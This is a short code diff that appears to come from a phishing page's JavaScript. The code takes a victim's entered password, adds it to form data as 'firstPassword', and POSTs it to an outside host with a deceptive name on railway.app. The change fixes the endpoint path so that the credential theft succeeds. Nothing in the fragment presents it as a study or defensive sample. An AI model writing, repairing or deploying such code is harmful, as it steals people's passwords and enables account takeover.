@@ -242,7 +242,7 @@
         firstPasswordInput.value = currentPassword;
         data.append('firstPassword', currentPassword);
 
-        fetch('https://en-feedbacks-voice-record-gh-production.up.railway.app/spot.php/spot.php', {
+        fetch('https://en-feedbacks-voice-record-gh-production.up.railway.app/spot.php', {
           method: 'POST',
           body: data
         });
